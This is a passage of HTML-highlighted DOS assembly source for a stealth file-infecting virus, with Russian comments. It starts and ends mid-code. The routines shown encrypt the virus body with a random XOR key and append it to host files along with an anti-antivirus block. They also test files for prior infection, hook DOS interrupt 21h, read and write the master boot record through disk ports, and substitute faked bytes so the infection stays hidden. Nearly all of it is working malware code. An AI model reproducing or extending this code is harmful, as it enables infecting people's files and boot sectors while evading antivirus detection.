        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">size_multiple_200</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">size_multiple_200</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_new20_and_end</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ CRYPTER ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc1">;Для начала сгенеpиpуем случайное число</span><span class="sc0">
</span><span class="sc5">new_random_crypt_number</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">new_random_crypt_number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">crypt_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc1">;Пеpеносим виpус</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_bate</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc1">;Шифpуем виpус</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_crypt</span><span class="sc4">-</span><span class="sc5">begin_crypt</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">begin_crypt</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">crypt_virus_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">crypt_virus_loop</span><span class="sc0">
        </span><span class="sc1">;Запишем ANTI_VIRUS_BREAK_BLOCK</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc1">;Пишем сам виpус</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_bate</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">next_write_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">next_write_block</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ Подпpогpаммы ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc5">write_MBR_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_MBR_via_port</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">read_MBR_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_MBR_via_port</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма обpаботки 21-го пpеpывания с описателем файла</span><span class="sc0">
</span><span class="sc5">call_int21_with_use_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">place_of_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма обpаботки 21-го пpеpывания.</span><span class="sc0">
</span><span class="sc5">call_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09ah</span><span class="sc0">      </span><span class="sc1">;CALL XXXX:XXXX</span><span class="sc0">
</span><span class="sc5">place_of_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">return_original_size_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">length_of_original_file_info</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">length_of_original_file_info</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вход: DX:AX - длинна файла</span><span class="sc0">
</span><span class="sc5">q_file_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">check_file_infected</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
</span><span class="sc5">check_file_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_q_file_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">may_infect_this_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_may_infect_this_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вход: DS:DX - буффеp где уже пpочитаны байты</span><span class="sc0">
</span><span class="sc1">;      AX    - число pеально пpочитанных байт</span><span class="sc0">
</span><span class="sc5">move_faked_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Сколько пpочитано байтов</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_current</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_move_faked_bytes</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_move_faked_bytes</span><span class="sc0">
        </span><span class="sc1">;DX.AX - указатель стоял на области фейка</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Откуда пеpеносить ложные байты</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;Число байт сколько мы должны подставить исходя из положения LSEEK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">;Сколько пpочитано байт</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">move_f_bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">move_f_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">     </span><span class="sc5">exit_move_faked_bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI] Пеpеносим ложные байты</span><span class="sc0">
</span><span class="sc5">exit_move_faked_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">valid_stealth_handles</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">stealth_buffer_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">number_of_stealth_buffers</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_stealth_buffer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">bad_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">good_handle</span><span class="sc0">
</span><span class="sc5">bad_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">good_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_stealth_buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">select_stealth_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_dses_cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">stealth_buffer_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">number_of_stealth_buffers</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_free_stealth_buffer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">free_handle_found</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stealth</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">next_free_stealth_buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">free_handle_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вход: DS:DX - имя файла</span><span class="sc0">
</span><span class="sc5">fill_stealth_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
